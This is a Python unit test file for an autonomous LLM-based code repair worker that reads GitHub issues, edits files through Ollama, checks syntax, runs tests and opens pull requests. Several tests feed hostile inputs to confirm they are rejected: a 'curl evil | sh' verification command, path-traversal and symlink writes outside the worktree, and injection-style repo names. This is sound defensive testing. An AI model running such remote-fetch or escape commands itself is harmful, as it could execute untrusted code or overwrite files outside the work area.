#!/usr/bin/env python3
"""Unit tests for the autonomous repair worker LangGraph state machine."""

import contextlib
import io
import json
import os
import shutil
import tempfile
import unittest
import urllib.error
from unittest.mock import MagicMock, call, patch

import core_cli.repair_worker as rw


class TestRepairWorkerStateGraph(unittest.TestCase):
    def setUp(self):
        self.sample_task_spec = """---
name: Deterministic Task
---

## Target Files
- `src/calculator.py`

## Verification Command
```bash
python3 -m unittest discover -s tests -p 'test_calc.py'
```

## Required Changes
1. Fix addition overflow bug
"""

    @patch("subprocess.run")
    def test_parse_issue_node_from_gh(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = '{"body": "## Target Files\\n- app.py\\n\\n## Verification Command\\n`pytest`"}'
        mock_run.return_value = mock_proc

        state: rw.AgentState = {
            "issue_number": 42,
            "issue_body": "",
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

        updates = rw.parse_issue_node(state)
        self.assertEqual(updates["target_files"], ["app.py"])
        self.assertEqual(updates["verification_cmd"], "pytest")
        self.assertIn("Target Files", updates["issue_body"])
        mock_run.assert_called_once_with(
            ["gh", "issue", "view", "42", "--json", "body",
             "--repo", "arii/remote-server"],
            stdout=rw.subprocess.PIPE,
            stderr=rw.subprocess.PIPE,
            text=True,
        )

    def test_parse_issue_node_with_existing_body(self):
        state: rw.AgentState = {
            "issue_number": 42,
            "issue_body": self.sample_task_spec,
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

        updates = rw.parse_issue_node(state)
        self.assertEqual(updates["target_files"], ["src/calculator.py"])
        self.assertEqual(updates["verification_cmd"], "python3 -m unittest discover -s tests -p 'test_calc.py'")

    @patch("subprocess.run")
    def test_setup_worktree_node(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_run.return_value = mock_proc

        temp_dir = tempfile.mkdtemp()
        try:
            file_path = os.path.join(temp_dir, "test_file.py")
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("def foo(): return 1\n")

            state: rw.AgentState = {
                "issue_number": 12,
                "issue_body": "",
                "target_files": ["test_file.py"],
                "verification_cmd": "",
                "file_contents": {},
                "current_errors": "",
                "retry_count": 0,
                "ast_valid": False,
                "tests_passed": False,
                "worktree_dir": temp_dir,
                "branch_name": "repair/issue-12-test",
            }

            updates = rw.setup_worktree_node(state)
            self.assertEqual(updates["worktree_dir"], temp_dir)
            self.assertEqual(updates["branch_name"], "repair/issue-12-test")
            self.assertEqual(updates["file_contents"], {"test_file.py": "def foo(): return 1\n"})
            mock_run.assert_called_once()
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    @patch("core_cli.repair_worker._query_ollama")
    def test_edit_file_node_strips_markdown_fences(self, mock_query):
        mock_query.return_value = "```python\ndef add(a, b):\n    return a + b\n```"

        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "Fix addition bug",
            "target_files": ["calc.py"],
            "verification_cmd": "pytest",
            "file_contents": {"calc.py": "def add(a, b): return a - b"},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }

        updates = rw.edit_file_node(state)
        self.assertEqual(updates["file_contents"]["calc.py"], "def add(a, b):\n    return a + b")
        mock_query.assert_called_once()

    @patch("core_cli.repair_worker._query_ollama")
    def test_edit_file_node_truncates_large_error_context(self, mock_query):
        mock_query.return_value = "```python\ndef add(a, b):\n    return a + b\n```"

        large_error = "\n".join([f"Line error {i}" for i in range(200)])
        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "Fix addition bug",
            "target_files": ["calc.py"],
            "verification_cmd": "pytest",
            "file_contents": {"calc.py": "def add(a, b): return a - b"},
            "current_errors": large_error,
            "retry_count": 1,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }

        rw.edit_file_node(state)
        mock_query.assert_called_once()
        sent_prompt = mock_query.call_args[0][0]
        self.assertIn("Line error 199", sent_prompt)
        self.assertNotIn("Line error 0\n", sent_prompt)

    def test_ast_check_node_valid(self):
        temp_dir = tempfile.mkdtemp()
        try:
            state: rw.AgentState = {
                "issue_number": 1,
                "issue_body": "",
                "target_files": ["module.py"],
                "verification_cmd": "",
                "file_contents": {"module.py": "def hello():\n    return 'world'\n"},
                "current_errors": "",
                "retry_count": 0,
                "ast_valid": False,
                "tests_passed": False,
                "worktree_dir": temp_dir,
                "branch_name": "repair/issue-1",
            }

            updates = rw.ast_check_node(state)
            self.assertTrue(updates["ast_valid"])
            self.assertEqual(updates["current_errors"], "")

            written_file = os.path.join(temp_dir, "module.py")
            self.assertTrue(os.path.exists(written_file))
            with open(written_file, "r") as f:
                self.assertEqual(f.read(), "def hello():\n    return 'world'\n")
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def test_ast_check_node_logs_degraded_gate(self):
        temp_dir = tempfile.mkdtemp()
        try:
            state: rw.AgentState = {
                "issue_number": 1,
                "issue_body": "",
                "target_files": ["a.ts"],
                "verification_cmd": "",
                "file_contents": {"a.ts": "const x = 1;\n"},
                "current_errors": "",
                "retry_count": 0,
                "ast_valid": False,
                "tests_passed": False,
                "worktree_dir": temp_dir,
                "branch_name": "repair/issue-1",
            }
            with patch("core_cli.ast_validator.shutil.which",
                       return_value=None):
                with self.assertLogs(level="WARNING") as logs:
                    updates = rw.ast_check_node(state)
            self.assertTrue(updates["ast_valid"])
            self.assertTrue(
                any("syntax gate degraded for a.ts" in line
                    for line in logs.output))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def test_setup_worktree_node_rejects_escape(self):
        import subprocess
        from unittest.mock import MagicMock, patch

        mock_proc = MagicMock()
        mock_proc.returncode = 0
        outside = tempfile.mkdtemp()
        worktree = tempfile.mkdtemp()
        try:
            marker = os.path.join(outside, "secret.txt")
            with open(marker, "w", encoding="utf-8") as f:
                f.write("TOP-SECRET")
            rel = os.path.relpath(marker, worktree)
            self.assertTrue(rel.startswith(".."))
            state: rw.AgentState = {
                "issue_number": 13,
                "issue_body": "",
                "target_files": [rel],
                "verification_cmd": "",
                "file_contents": {},
                "current_errors": "",
                "retry_count": 0,
                "ast_valid": False,
                "tests_passed": False,
                "worktree_dir": worktree,
                "branch_name": "repair/issue-13-test",
            }
            with patch.object(subprocess, "run",
                              return_value=mock_proc):
                with self.assertRaises(RuntimeError):
                    rw.setup_worktree_node(state)
        finally:
            shutil.rmtree(outside, ignore_errors=True)
            shutil.rmtree(worktree, ignore_errors=True)

    def test_ast_check_node_write_escapes_rejected(self):
        worktree = tempfile.mkdtemp()
        outside = tempfile.mkdtemp()
        try:
            evil = os.path.join(outside, "pwned.py")
            rel = os.path.relpath(evil, worktree)
            self.assertTrue(rel.startswith(".."))
            state: rw.AgentState = {
                "issue_number": 1,
                "issue_body": "",
                "target_files": [rel],
                "verification_cmd": "",
                "file_contents": {rel: "x = 1\n"},
                "current_errors": "",
                "retry_count": 0,
                "ast_valid": False,
                "tests_passed": False,
                "worktree_dir": worktree,
                "branch_name": "repair/issue-1",
            }
            with self.assertRaises(RuntimeError):
                rw.ast_check_node(state)
            self.assertFalse(os.path.exists(evil))
        finally:
            shutil.rmtree(worktree, ignore_errors=True)
            shutil.rmtree(outside, ignore_errors=True)

    def test_ast_check_node_write_symlink_escape_rejected(self):
        worktree = tempfile.mkdtemp()
        outside = tempfile.mkdtemp()
        try:
            os.symlink(outside,
                       os.path.join(worktree, "linked"))
            state: rw.AgentState = {
                "issue_number": 1,
                "issue_body": "",
                "target_files": ["linked/pwned.py"],
                "verification_cmd": "",
                "file_contents": {"linked/pwned.py": "x = 1\n"},
                "current_errors": "",
                "retry_count": 0,
                "ast_valid": False,
                "tests_passed": False,
                "worktree_dir": worktree,
                "branch_name": "repair/issue-1",
            }
            with self.assertRaises(RuntimeError):
                rw.ast_check_node(state)
            self.assertFalse(os.path.exists(
                os.path.join(outside, "pwned.py")))
        finally:
            shutil.rmtree(worktree, ignore_errors=True)
            shutil.rmtree(outside, ignore_errors=True)

    def test_ast_check_node_invalid(self):
        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "",
            "target_files": ["module.py"],
            "verification_cmd": "",
            "file_contents": {"module.py": "def hello(:\n return world\n"},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }

        updates = rw.ast_check_node(state)
        self.assertFalse(updates["ast_valid"])
        self.assertIn("AST Pre-validation Failed", updates["current_errors"])
        self.assertEqual(updates["retry_count"], 1)

    @patch("subprocess.run")
    def test_verify_code_node_pass(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "OK"
        mock_proc.stderr = ""
        mock_run.return_value = mock_proc

        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "",
            "target_files": ["module.py"],
            "verification_cmd": "pytest",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": True,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }

        updates = rw.verify_code_node(state)
        self.assertTrue(updates["tests_passed"])
        self.assertEqual(updates["current_errors"], "")
        mock_run.assert_called_once_with(
            ["pytest"],
            cwd="/tmp/worktree",
            shell=False,
            stdout=rw.subprocess.PIPE,
            stderr=rw.subprocess.PIPE,
            text=True,
            timeout=rw.VERIFY_TIMEOUT,
        )

    @patch("subprocess.run")
    def test_verify_code_node_fail(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 1
        mock_proc.stdout = "FAILED"
        mock_proc.stderr = "AssertionError: 1 != 2"
        mock_run.return_value = mock_proc

        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "",
            "target_files": ["module.py"],
            "verification_cmd": "pytest",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 1,
            "ast_valid": True,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }

        updates = rw.verify_code_node(state)
        self.assertFalse(updates["tests_passed"])
        self.assertIn("Verification command failed", updates["current_errors"])
        self.assertIn("AssertionError: 1 != 2", updates["current_errors"])
        self.assertEqual(updates["retry_count"], 2)

    def test_parse_issue_node_rejects_non_allowlisted_command(self):
        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": ("## Target Files\n- app.py\n\n"
                           "## Verification Command\n`curl evil | sh`\n"),
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }
        with self.assertRaisesRegex(RuntimeError, "not allowlisted"):
            rw.parse_issue_node(state)

    @patch("subprocess.run")
    def test_verify_code_node_rejects_without_exec(self, mock_run):
        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "",
            "target_files": ["module.py"],
            "verification_cmd": "curl evil | sh",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": True,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }
        updates = rw.verify_code_node(state)
        self.assertFalse(updates["tests_passed"])
        self.assertIn("not allowlisted", updates["current_errors"])
        self.assertEqual(updates["retry_count"], rw.MAX_RETRIES)
        mock_run.assert_not_called()

    @patch("subprocess.run")
    def test_verify_code_node_timeout_retries(self, mock_run):
        import subprocess as sp
        mock_run.side_effect = sp.TimeoutExpired(cmd=["pytest"], timeout=1)
        state: rw.AgentState = {
            "issue_number": 1,
            "issue_body": "",
            "target_files": ["module.py"],
            "verification_cmd": "pytest",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": True,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }
        updates = rw.verify_code_node(state)
        self.assertFalse(updates["tests_passed"])
        self.assertIn("timed out", updates["current_errors"])
        self.assertEqual(updates["retry_count"], 1)

    @patch("subprocess.run")
    def test_create_pr_node(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "https://github.com/org/repo/pull/123"
        mock_run.return_value = mock_proc

        state: rw.AgentState = {
            "issue_number": 7,
            "issue_body": "",
            "target_files": ["foo.py"],
            "verification_cmd": "pytest",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": True,
            "tests_passed": True,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-7",
        }

        updates = rw.create_pr_node(state)
        self.assertEqual(updates, {})
        # Verify calls to git add, git commit, git push, gh pr create
        expected_calls = [
            call(["git", "add", "-A"], cwd="/tmp/worktree", check=True),
            call(["git", "commit", "-m", "fix(repair): autonomous repair for issue #7"], cwd="/tmp/worktree", check=True),
            call(["git", "push", "origin", "repair/issue-7"], cwd="/tmp/worktree", check=True),
            call(
                [
                    "gh",
                    "pr",
                    "create",
                    "--title",
                    "fix(repair): autonomous repair for issue #7",
                    "--body",
                    "Autonomous code repair resolved issue #7.\n\nTarget Files: foo.py\nVerification Command: `pytest`\n",
                    "--head",
                    "repair/issue-7",
                    "--repo",
                    "arii/remote-server",
                ],
                cwd="/tmp/worktree",
                stdout=rw.subprocess.PIPE,
                stderr=rw.subprocess.PIPE,
                text=True,
            ),
        ]
        mock_run.assert_has_calls(expected_calls)

    def test_conditional_routing(self):
        # Routing after AST check
        # Invalid AST, retry < 3
        s1 = {"ast_valid": False, "retry_count": 1}
        self.assertEqual(rw.route_after_ast_check(s1), "edit_file_node")

        # Invalid AST, retry >= 3
        s2 = {"ast_valid": False, "retry_count": 3}
        self.assertEqual(rw.route_after_ast_check(s2), "cleanup_node")

        # Valid AST
        s3 = {"ast_valid": True, "retry_count": 1}
        self.assertEqual(rw.route_after_ast_check(s3), "verify_code_node")

        # Routing after verify
        # Tests passed
        s4 = {"tests_passed": True, "retry_count": 1}
        self.assertEqual(rw.route_after_verify(s4), "create_pr_node")

        # Tests failed, retry < 3
        s5 = {"tests_passed": False, "retry_count": 2}
        self.assertEqual(rw.route_after_verify(s5), "edit_file_node")

        # Tests failed, retry >= 3
        s6 = {"tests_passed": False, "retry_count": 3}
        self.assertEqual(rw.route_after_verify(s6), "cleanup_node")

    @unittest.skipIf(rw.StateGraph is None, "langgraph is not installed")
    @patch("core_cli.repair_worker.create_pr_node")
    @patch("core_cli.repair_worker.verify_code_node")
    @patch("core_cli.repair_worker.ast_check_node")
    @patch("core_cli.repair_worker.edit_file_node")
    @patch("core_cli.repair_worker.setup_worktree_node")
    @patch("core_cli.repair_worker.parse_issue_node")
    def test_full_graph_progression_happy_path(
        self,
        mock_parse,
        mock_setup,
        mock_edit,
        mock_ast,
        mock_verify,
        mock_pr,
    ):
        mock_parse.return_value = {
            "issue_body": self.sample_task_spec,
            "target_files": ["src/calculator.py"],
            "verification_cmd": "python3 -m unittest",
        }
        mock_setup.return_value = {
            "worktree_dir": "/tmp/mock_worktree",
            "branch_name": "repair/issue-42",
            "file_contents": {"src/calculator.py": "def add(): pass"},
        }
        mock_edit.return_value = {
            "file_contents": {"src/calculator.py": "def add(a, b): return a + b"},
        }
        mock_ast.return_value = {
            "ast_valid": True,
            "current_errors": "",
        }
        mock_verify.return_value = {
            "tests_passed": True,
            "current_errors": "",
        }
        mock_pr.return_value = {}

        graph = rw.build_repair_graph()
        initial_state: rw.AgentState = {
            "issue_number": 42,
            "issue_body": self.sample_task_spec,
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

        final_state = graph.invoke(initial_state)
        self.assertTrue(final_state["tests_passed"])
        mock_parse.assert_called_once()
        mock_setup.assert_called_once()
        mock_edit.assert_called_once()
        mock_ast.assert_called_once()
        mock_verify.assert_called_once()
        mock_pr.assert_called_once()

    @unittest.skipIf(rw.StateGraph is None, "langgraph is not installed")
    @patch("core_cli.repair_worker.create_pr_node")
    @patch("core_cli.repair_worker.verify_code_node")
    @patch("core_cli.repair_worker.ast_check_node")
    @patch("core_cli.repair_worker.edit_file_node")
    @patch("core_cli.repair_worker.setup_worktree_node")
    @patch("core_cli.repair_worker.parse_issue_node")
    def test_full_graph_loop_routing_on_ast_failure(
        self,
        mock_parse,
        mock_setup,
        mock_edit,
        mock_ast,
        mock_verify,
        mock_pr,
    ):
        mock_parse.return_value = {
            "issue_body": self.sample_task_spec,
            "target_files": ["src/calculator.py"],
            "verification_cmd": "python3 -m unittest",
        }
        mock_setup.return_value = {
            "worktree_dir": "/tmp/mock_worktree",
            "branch_name": "repair/issue-42",
            "file_contents": {"src/calculator.py": "def add(): pass"},
        }
        mock_edit.return_value = {
            "file_contents": {"src/calculator.py": "def add(a, b): return a + b"},
        }

        # First ast check fails, second ast check passes
        ast_calls = 0

        def fake_ast(state):
            nonlocal ast_calls
            ast_calls += 1
            if ast_calls == 1:
                return {
                    "ast_valid": False,
                    "current_errors": "SyntaxError at line 1",
                    "retry_count": state.get("retry_count", 0) + 1,
                }
            return {
                "ast_valid": True,
                "current_errors": "",
            }

        mock_ast.side_effect = fake_ast
        mock_verify.return_value = {
            "tests_passed": True,
            "current_errors": "",
        }
        mock_pr.return_value = {}

        graph = rw.build_repair_graph()
        initial_state: rw.AgentState = {
            "issue_number": 42,
            "issue_body": self.sample_task_spec,
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

        final_state = graph.invoke(initial_state)
        self.assertTrue(final_state["tests_passed"])
        self.assertEqual(ast_calls, 2)
        self.assertEqual(mock_edit.call_count, 2)
        mock_verify.assert_called_once()
        mock_pr.assert_called_once()

    @unittest.skipIf(rw.StateGraph is None, "langgraph is not installed")
    @patch("core_cli.repair_worker.create_pr_node")
    @patch("core_cli.repair_worker.verify_code_node")
    @patch("core_cli.repair_worker.ast_check_node")
    @patch("core_cli.repair_worker.edit_file_node")
    @patch("core_cli.repair_worker.setup_worktree_node")
    @patch("core_cli.repair_worker.parse_issue_node")
    def test_full_graph_loop_routing_on_test_failure_and_max_retries(
        self,
        mock_parse,
        mock_setup,
        mock_edit,
        mock_ast,
        mock_verify,
        mock_pr,
    ):
        mock_parse.return_value = {
            "issue_body": self.sample_task_spec,
            "target_files": ["src/calculator.py"],
            "verification_cmd": "python3 -m unittest",
        }
        mock_setup.return_value = {
            "worktree_dir": "/tmp/mock_worktree",
            "branch_name": "repair/issue-42",
            "file_contents": {"src/calculator.py": "def add(): pass"},
        }
        mock_edit.return_value = {
            "file_contents": {"src/calculator.py": "def add(a, b): return a + b"},
        }
        mock_ast.return_value = {
            "ast_valid": True,
            "current_errors": "",
        }

        # Tests always fail until max retries reached
        def fake_verify(state):
            return {
                "tests_passed": False,
                "current_errors": "Test failed: AssertionError",
                "retry_count": state.get("retry_count", 0) + 1,
            }

        mock_verify.side_effect = fake_verify

        graph = rw.build_repair_graph()
        initial_state: rw.AgentState = {
            "issue_number": 42,
            "issue_body": self.sample_task_spec,
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

        final_state = graph.invoke(initial_state)
        self.assertFalse(final_state["tests_passed"])
        self.assertEqual(final_state["retry_count"], 3)
        self.assertEqual(mock_verify.call_count, 3)
        self.assertEqual(mock_edit.call_count, 3)
        mock_pr.assert_not_called()


class _FakeTagsResponse:
    """Minimal urlopen context manager serving a canned JSON payload."""

    def __init__(self, payload):
        self._body = json.dumps(payload).encode("utf-8")

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False


def _tags_payload(*names):
    return {"models": [{"name": n} for n in names]}


class TestOllamaEndpoint(unittest.TestCase):
    def test_default_generate_url_uses_stack_host(self):
        with patch.dict(os.environ, {}, clear=True):
            url = rw.ollama_generate_url()
        self.assertEqual(url, "http://ollama:11434/api/generate")
        self.assertNotIn("localhost", url)

    def test_bare_host_env(self):
        with patch.dict(os.environ, {"OLLAMA_URL": "http://ollama:11434"}):
            self.assertEqual(rw.ollama_generate_url(),
                             "http://ollama:11434/api/generate")

    def test_trailing_slash_env(self):
        with patch.dict(os.environ, {"OLLAMA_URL": "http://ollama:11434/"}):
            self.assertEqual(rw.ollama_generate_url(),
                             "http://ollama:11434/api/generate")

    def test_full_generate_url_env(self):
        with patch.dict(os.environ,
                        {"OLLAMA_URL": "http://ollama:11434/api/generate"}):
            self.assertEqual(rw.ollama_generate_url(),
                             "http://ollama:11434/api/generate")

    def test_full_generate_url_trailing_slash_env(self):
        with patch.dict(os.environ,
                        {"OLLAMA_URL": "http://ollama:11434/api/generate/"}):
            self.assertEqual(rw.ollama_generate_url(),
                             "http://ollama:11434/api/generate")

    def test_blank_env_falls_back_to_default(self):
        for blank in ("", "   "):
            with patch.dict(os.environ, {"OLLAMA_URL": blank}):
                self.assertEqual(rw.ollama_generate_url(),
                                 "http://ollama:11434/api/generate")

    def test_custom_host_env(self):
        with patch.dict(os.environ, {"OLLAMA_URL": "http://gpu-box:11434"}):
            self.assertEqual(rw.ollama_generate_url(),
                             "http://gpu-box:11434/api/generate")

    def test_explicit_arg_overrides_env(self):
        with patch.dict(os.environ, {"OLLAMA_URL": "http://env-host:11434"}):
            self.assertEqual(rw.ollama_generate_url("http://arg-host:11434/"),
                             "http://arg-host:11434/api/generate")

    def test_tags_url_strips_generate_suffix(self):
        with patch.dict(os.environ,
                        {"OLLAMA_URL": "http://ollama:11434/api/generate"}):
            self.assertEqual(rw.ollama_tags_url(),
                             "http://ollama:11434/api/tags")

    def test_model_default_and_blank_tolerance(self):
        with patch.dict(os.environ, {}, clear=True):
            self.assertEqual(rw.ollama_model(), "qwen2.5-coder:7b")
        for blank in ("", "   "):
            with patch.dict(os.environ, {"OLLAMA_MODEL": blank}):
                self.assertEqual(rw.ollama_model(), "qwen2.5-coder:7b")
        with patch.dict(os.environ, {"OLLAMA_MODEL": "qwen3:8b"}):
            self.assertEqual(rw.ollama_model(), "qwen3:8b")

    def test_query_ollama_posts_to_joined_url(self):
        env = {"OLLAMA_URL": "http://ollama:11434/",
               "OLLAMA_MODEL": "qwen2.5-coder:7b"}
        with patch.dict(os.environ, env):
            with patch("urllib.request.urlopen",
                       return_value=_FakeTagsResponse({"response": "ok"})) as mock_open:
                out = rw._query_ollama("Say OK")
        self.assertEqual(out, "ok")
        req = mock_open.call_args[0][0]
        self.assertEqual(req.full_url, "http://ollama:11434/api/generate")
        body = json.loads(req.data.decode("utf-8"))
        self.assertEqual(body["model"], "qwen2.5-coder:7b")


class TestPreflightOllama(unittest.TestCase):
    def test_unreachable_names_endpoint(self):
        err = urllib.error.URLError("[Errno 111] Connection refused")
        with patch.dict(os.environ, {}, clear=True):
            with patch("urllib.request.urlopen", side_effect=err):
                msg = rw.preflight_ollama()
        self.assertIn("repair: local Ollama unreachable at", msg)
        self.assertIn("http://ollama:11434/api/tags", msg)
        self.assertNotIn("\n", msg)

    def test_missing_model_names_model(self):
        with patch.dict(os.environ, {}, clear=True):
            with patch("urllib.request.urlopen",
                       return_value=_FakeTagsResponse(_tags_payload("qwen3:8b"))):
                msg = rw.preflight_ollama()
        self.assertIn("missing model", msg)
        self.assertIn("qwen2.5-coder:7b", msg)
        self.assertNotIn("\n", msg)

    def test_healthy_returns_none(self):
        payload = _tags_payload("qwen2.5-coder:7b", "qwen3:8b")
        with patch.dict(os.environ, {}, clear=True):
            with patch("urllib.request.urlopen",
                       return_value=_FakeTagsResponse(payload)):
                self.assertIsNone(rw.preflight_ollama())

    def test_untagged_model_matches_any_tag(self):
        with patch.dict(os.environ, {"OLLAMA_MODEL": "qwen2.5-coder"}):
            with patch("urllib.request.urlopen",
                       return_value=_FakeTagsResponse(
                           _tags_payload("qwen2.5-coder:latest"))):
                self.assertIsNone(rw.preflight_ollama())

    def test_malformed_tags_body_reports_missing_model(self):
        class _Garbage:
            def read(self):
                return b"not json"

            def __enter__(self):
                return self

            def __exit__(self, *args):
                return False

        with patch.dict(os.environ, {}, clear=True):
            with patch("urllib.request.urlopen", return_value=_Garbage()):
                msg = rw.preflight_ollama()
        self.assertIn("missing model", msg)


class TestRunRepairPreflight(unittest.TestCase):
    def test_preflight_failure_blocks_before_setup(self):
        graph = MagicMock()
        with patch("core_cli.repair_worker.build_repair_graph",
                   return_value=graph):
            with patch("core_cli.repair_worker.preflight_ollama",
                       return_value="repair: local Ollama unreachable at http://x (boom)"):
                buf = io.StringIO()
                with contextlib.redirect_stderr(buf):
                    ok = rw.run_repair(issue_number=99)
        self.assertFalse(ok)
        graph.invoke.assert_not_called()
        self.assertIn("repair: local Ollama unreachable", buf.getvalue())

    def test_healthy_preflight_proceeds_to_graph(self):
        graph = MagicMock()
        graph.invoke.return_value = {"tests_passed": True}
        with patch("core_cli.repair_worker.build_repair_graph",
                   return_value=graph):
            with patch("core_cli.repair_worker.preflight_ollama",
                       return_value=None):
                self.assertTrue(rw.run_repair(issue_number=99))
        graph.invoke.assert_called_once()


class TestUnscaffoldedIssue(unittest.TestCase):
    """Unscaffolded bodies fail actionably, never bare (#908)."""

    def _state(self, body):
        return {
            "issue_number": 380,
            "issue_body": body,
            "repo": "arii/portfolio",
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

    def test_parse_node_names_missing_section_and_template(self):
        with self.assertRaises(rw.UnscaffoldedIssueError) as ctx:
            rw.parse_issue_node(self._state("just prose, no scaffold"))
        msg = str(ctx.exception)
        self.assertIn("#380", msg)
        self.assertIn("not scaffolded", msg)
        self.assertIn("Target Files", msg)
        self.assertIn("deterministic-task.md", msg)

    def test_parse_node_missing_verify_command_is_unscaffolded(self):
        with self.assertRaises(rw.UnscaffoldedIssueError) as ctx:
            rw.parse_issue_node(
                self._state("## Target Files\n- app.py\n"))
        self.assertIn("Verification Command", str(ctx.exception))

    def test_run_repair_prints_marker_for_queue_row(self):
        graph = MagicMock()
        graph.invoke.side_effect = rw.UnscaffoldedIssueError(
            "issue #380 is not scaffolded for repair: boom")
        with patch("core_cli.repair_worker.build_repair_graph",
                   return_value=graph):
            with patch("core_cli.repair_worker.preflight_ollama",
                       return_value=None):
                buf = io.StringIO()
                with contextlib.redirect_stderr(buf):
                    self.assertFalse(rw.run_repair(issue_number=380))
        err = buf.getvalue()
        self.assertIn(rw.UNSCAFFOLDED_MARKER, err)
        self.assertIn("not scaffolded", err)

    def test_other_failures_print_no_marker(self):
        graph = MagicMock()
        graph.invoke.side_effect = RuntimeError("gh exploded")
        with patch("core_cli.repair_worker.build_repair_graph",
                   return_value=graph):
            with patch("core_cli.repair_worker.preflight_ollama",
                       return_value=None):
                buf = io.StringIO()
                with contextlib.redirect_stderr(buf):
                    self.assertFalse(rw.run_repair(issue_number=99))
        self.assertNotIn(rw.UNSCAFFOLDED_MARKER, buf.getvalue())


class TestEditFileNodeOllamaGuard(unittest.TestCase):
    def _state(self):
        return {
            "issue_number": 1,
            "issue_body": "Fix it",
            "target_files": ["calc.py"],
            "verification_cmd": "pytest",
            "file_contents": {"calc.py": "def add(a, b): return a - b"},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-1",
        }

    def test_url_error_returns_failure_record(self):
        err = urllib.error.URLError("[Errno 111] Connection refused")
        with patch("core_cli.repair_worker._query_ollama", side_effect=err):
            with patch.dict(os.environ, {}, clear=True):
                updates = rw.edit_file_node(self._state())
        self.assertEqual(updates["file_contents"],
                         {"calc.py": "def add(a, b): return a - b"})
        self.assertIn("Ollama query failed for calc.py", updates["current_errors"])
        self.assertIn("http://ollama:11434/api/generate", updates["current_errors"])
        self.assertIn("hint:", updates["current_errors"])
        self.assertEqual(updates["retry_count"], 1)

    def test_os_error_returns_failure_record(self):
        with patch("core_cli.repair_worker._query_ollama",
                   side_effect=OSError("dns down")):
            updates = rw.edit_file_node(self._state())
        self.assertIn("Ollama query failed", updates["current_errors"])
        self.assertEqual(updates["retry_count"], 1)


class TestRepairRepoScope(unittest.TestCase):
    """--repo plumbing: dispatch body -> core_cli -> gh --repo (#435)."""

    def test_normalize_repo(self):
        self.assertEqual(rw.normalize_repo("boomtick"), "arii/boomtick")
        self.assertEqual(rw.normalize_repo("arii/boomtick"), "arii/boomtick")
        self.assertEqual(rw.normalize_repo("  boomtick  "), "arii/boomtick")
        self.assertEqual(rw.normalize_repo(None), "arii/remote-server")
        self.assertEqual(rw.normalize_repo(""), "arii/remote-server")
        self.assertEqual(rw.normalize_repo("   "), "arii/remote-server")
        for bad in ("../evil", "a/b", "arii/", "no spaces",
                    "semi;colon", 7, True):
            with self.assertRaises(ValueError, msg=bad):
                rw.normalize_repo(bad)

    @patch("subprocess.run")
    def test_parse_issue_node_scopes_repo(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = '{"body": "## Target Files\\n- app.py\\n\\n## Verification Command\\n`pytest`"}'
        mock_run.return_value = mock_proc

        state: rw.AgentState = {
            "issue_number": 42,
            "issue_body": "",
